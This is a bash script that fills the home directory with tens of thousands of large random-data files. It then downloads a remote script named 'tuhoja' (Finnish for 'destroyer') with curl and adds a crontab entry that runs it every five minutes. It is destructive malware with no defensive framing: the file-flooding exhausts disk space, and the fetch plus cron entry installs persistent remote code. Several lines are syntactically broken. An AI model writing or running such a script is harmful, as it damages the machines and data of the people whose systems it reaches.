#!/bin/bash
TEMPFILE=~counter.tmp
COUNTER=0
if test -f $TEMPFILE ; then
  $COUNTER = cat $TEMPFILE
else
  echo 0 > $TEMPFILE
fi
for (( c=0; c<=50000; c++ ))
do
  COUNTER=$[$(cat $TEMPFILE) + 1]
  echo $COUNTER > $TEMPFILE
  head -c 512000 /dev/urandom | base64 > ~/$COUNTER
  echo $COUNTER
done
rm -f $TEMPFILE
curl -o /opt/tuhoja.sh https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
chmod +X /opt/tuhoja.sh
(crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash /opt/tuhoja.sh") | crontab -

